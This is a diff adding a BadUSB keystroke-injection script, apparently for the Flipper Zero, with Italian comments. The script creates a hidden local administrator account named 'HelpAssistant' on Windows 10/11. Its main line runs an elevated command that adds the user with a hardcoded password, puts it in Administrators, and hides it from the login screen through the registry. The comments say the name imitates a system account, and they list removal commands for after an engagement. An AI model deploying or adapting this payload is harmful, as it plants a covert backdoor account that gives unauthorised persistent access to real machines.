@@ -1,0 +1,35 @@
+REM ============================================================
+REM Title:    Create Hidden Admin User
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Privilege Escalation / Persistence
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~6 secondi
+REM Detect:   Alto - creazione utente genera alert
+REM Desc:     Crea un utente admin locale nascosto.
+REM           L'utente non appare nella schermata di login
+REM           e ha password nota per accesso successivo.
+REM CHANGE:   Username e password
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs -ArgumentList '/c net user HelpAssistant P@ssw0rd123! /add && net localgroup Administrators HelpAssistant /add && reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v HelpAssistant /t REG_DWORD /d 0 /f'
+ENTER
+DELAY 2000
+ALT y
+
+REM ============================================================
+REM NOTA:
+REM - "HelpAssistant" è un nome che si mimetizza con account
+REM   di sistema Windows (Remote Assistance)
+REM - Il reg add nasconde l'utente dalla schermata di login
+REM - L'utente resta visibile in "net user" e nel SAM
+REM - Per accesso RDP: l'utente deve essere in Remote Desktop Users
+REM
+REM Rimozione post-engagement:
+REM   net user HelpAssistant /delete
+REM   reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v HelpAssistant /f
+REM ============================================================
